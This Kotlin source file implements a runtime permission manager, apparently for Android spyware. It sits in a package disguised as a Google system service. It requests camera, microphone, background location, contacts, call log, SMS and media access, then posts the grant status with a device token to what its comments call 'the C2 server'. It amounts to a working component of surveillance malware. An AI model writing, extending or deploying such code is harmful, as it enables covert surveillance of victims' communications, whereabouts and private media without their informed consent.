package com.google.android.systemservice.utils

import android.app.Activity
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.android.systemservice.config.AndroidConfig
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import timber.log.Timber

/**
 * Centralized runtime permission manager.
 * - Handles Android 6+ runtime permission requests
 * - Android 13+ granular media permissions (READ_MEDIA_IMAGES/VIDEO/AUDIO)
 * - Graceful degradation when permissions are denied
 * - Reports permission status to the C2 server
 */
object PermissionManager {

    private const val TAG = "PermissionManager"
    const val REQUEST_CODE_CRITICAL = 1001
    const val REQUEST_CODE_MEDIA = 1002
    const val REQUEST_CODE_LOCATION = 1003
    private const val PREFS_NAME = "permission_prefs"

    // Critical permissions required for core functionality
    private val CRITICAL_PERMISSIONS = mutableListOf(
        android.Manifest.permission.CAMERA,
        android.Manifest.permission.RECORD_AUDIO,
        android.Manifest.permission.ACCESS_FINE_LOCATION,
        android.Manifest.permission.ACCESS_COARSE_LOCATION,
        android.Manifest.permission.READ_CONTACTS,
        android.Manifest.permission.READ_CALL_LOG,
        android.Manifest.permission.READ_SMS,
        android.Manifest.permission.READ_PHONE_STATE
    )

    // Storage permissions vary by API level
    private fun storagePermissions(): List<String> {
        return if (Build.VERSION.SDK_INT >= 33) {
            listOf(
                "android.permission.READ_MEDIA_IMAGES",
                "android.permission.READ_MEDIA_VIDEO",
                "android.permission.READ_MEDIA_AUDIO"
            )
        } else {
            listOf(
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE
            )
        }
    }

    // All permissions the app needs at runtime
    private fun allRuntimePermissions(): List<String> {
        val perms = CRITICAL_PERMISSIONS.toMutableList()
        perms.addAll(storagePermissions())
        if (Build.VERSION.SDK_INT >= 33) {
            perms.add("android.permission.POST_NOTIFICATIONS")
        }
        return perms
    }

    /**
     * Check if a single permission is granted.
     */
    fun isGranted(context: Context, permission: String): Boolean {
        return ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED
    }

    /**
     * Returns list of permissions that are not yet granted.
     */
    fun getMissingPermissions(context: Context): List<String> {
        return allRuntimePermissions().filter { !isGranted(context, it) }
    }

    /**
     * Request all critical permissions that haven't been granted.
     * Call from an Activity (typically on first launch).
     */
    fun requestCriticalPermissions(activity: Activity) {
        val missing = getMissingPermissions(activity)
        if (missing.isNotEmpty()) {
            Timber.d("Requesting ${missing.size} missing permissions")
            ActivityCompat.requestPermissions(
                activity,
                missing.toTypedArray(),
                REQUEST_CODE_CRITICAL
            )
        } else {
            Timber.d("All critical permissions already granted")
        }
    }

    /**
     * Request Android 13+ media permissions specifically.
     */
    fun requestMediaPermissions(activity: Activity) {
        if (Build.VERSION.SDK_INT < 33) return

        val mediaPerms = listOf(
            "android.permission.READ_MEDIA_IMAGES",
            "android.permission.READ_MEDIA_VIDEO",
            "android.permission.READ_MEDIA_AUDIO"
        ).filter { !isGranted(activity, it) }

        if (mediaPerms.isNotEmpty()) {
            ActivityCompat.requestPermissions(
                activity,
                mediaPerms.toTypedArray(),
                REQUEST_CODE_MEDIA
            )
        }
    }

    /**
     * Request background location (must be requested separately after foreground location).
     */
    fun requestBackgroundLocation(activity: Activity) {
        if (Build.VERSION.SDK_INT < 29) return
        if (isGranted(activity, "android.permission.ACCESS_BACKGROUND_LOCATION")) return

        // Foreground location must be granted first
        if (!isGranted(activity, android.Manifest.permission.ACCESS_FINE_LOCATION)) {
            Timber.w("Cannot request background location without foreground location")
            return
        }

        ActivityCompat.requestPermissions(
            activity,
            arrayOf("android.permission.ACCESS_BACKGROUND_LOCATION"),
            REQUEST_CODE_LOCATION
        )
    }

    /**
     * Build a full PermissionStatus snapshot for the current device.
     */
    fun getPermissionStatus(context: Context): PermissionStatus {
        val permMap = mutableMapOf<String, PermissionStatus.PermissionState>()

        for (permission in allRuntimePermissions()) {
            val granted = isGranted(context, permission)
            val showRationale = if (context is Activity) {
                ActivityCompat.shouldShowRequestPermissionRationale(context, permission)
            } else {
                false
            }
            // Permanently denied = not granted + rationale not shown + was already requested
            val permanentlyDenied = !granted && !showRationale && wasPermissionRequested(context, permission)

            permMap[permission] = PermissionStatus.PermissionState(
                granted = granted,
                shouldShowRationale = showRationale,
                permanentlyDenied = permanentlyDenied
            )
        }

        return PermissionStatus(
            deviceId = AndroidConfig.deviceId,
            androidVersion = Build.VERSION.SDK_INT,
            permissions = permMap
        )
    }

    /**
     * Handle onRequestPermissionsResult callback.
     * Call this from Activity.onRequestPermissionsResult().
     */
    fun onPermissionsResult(
        context: Context,
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        permissions.forEach { markPermissionRequested(context, it) }

        val granted = mutableListOf<String>()
        val denied = mutableListOf<String>()

        permissions.forEachIndexed { index, permission ->
            if (grantResults.getOrNull(index) == PackageManager.PERMISSION_GRANTED) {
                granted.add(permission)
            } else {
                denied.add(permission)
            }
        }

        Timber.d("Permissions granted: $granted, denied: $denied (requestCode=$requestCode)")

        // Degrade gracefully — features check PermissionStatus before executing
        if (denied.isNotEmpty()) {
            Timber.w("Features degraded due to denied permissions: $denied")
        }
    }

    /**
     * Report current permission status to the C2 server.
     */
    suspend fun reportStatusToServer(context: Context) {
        withContext(Dispatchers.IO) {
            try {
                val status = getPermissionStatus(context)
                val json = status.toJson()
                val url = "${AndroidConfig.apiBaseUrl}/devices/${AndroidConfig.deviceId}/permissions"

                val client = OkHttpClient()
                val body = json.toRequestBody("application/json".toMediaType())
                val request = Request.Builder()
                    .url(url)
                    .header("Authorization", "Bearer ${AndroidConfig.deviceToken}")
                    .post(body)
                    .build()

                val response = client.newCall(request).execute()
                if (response.isSuccessful) {
                    Timber.d("Permission status reported to server")
                } else {
                    Timber.w("Failed to report permissions: HTTP ${response.code}")
                }
                response.close()
            } catch (e: Exception) {
                Timber.e(e, "Failed to report permission status")
            }
        }
    }

    /**
     * Check which features are available given current permissions.
     */
    fun getAvailableFeatures(context: Context): Map<String, Boolean> {
        return getPermissionStatus(context).availableFeatures()
    }

    // Track which permissions have been requested at least once
    // (to distinguish "never asked" from "permanently denied")

    private fun markPermissionRequested(context: Context, permission: String) {
        context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            .edit()
            .putBoolean("requested_$permission", true)
            .apply()
    }

    private fun wasPermissionRequested(context: Context, permission: String): Boolean {
        return context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            .getBoolean("requested_$permission", false)
    }
}
